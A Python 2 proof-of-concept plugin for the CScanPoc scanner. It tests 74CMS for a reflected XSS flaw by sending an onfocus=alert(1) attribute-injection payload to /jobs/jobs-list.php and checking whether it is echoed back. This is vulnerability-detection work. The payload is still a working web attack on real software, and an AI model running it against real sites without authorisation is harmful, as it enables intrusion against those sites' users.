# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = '74CMS_0002' # 平台漏洞编号，留空
    name = '骑士CMS 反射型XSS'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = 'Unkonwn'  # 漏洞公布时间
    desc = '''
        骑士CMS /jobs/jobs-list.php?key=%22%20autofocus%20onfocus=alert%281%29%20style=%22%22 反射型XSS漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '74CMS(骑士CMS)'  # 漏洞应用名称
    product_version = '74cms'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'dd27544f-01b7-4ee1-81de-287e155ee3fa'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = '/jobs/jobs-list.php?key=%22%20autofocus%20onfocus=alert%281%29%20style=%22%22'
            verify_url = self.target + payload

            req = requests.get(verify_url)
            if req.status_code == 200:
                if '" autofocus onfocus=alert(1) style=' in req.content:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()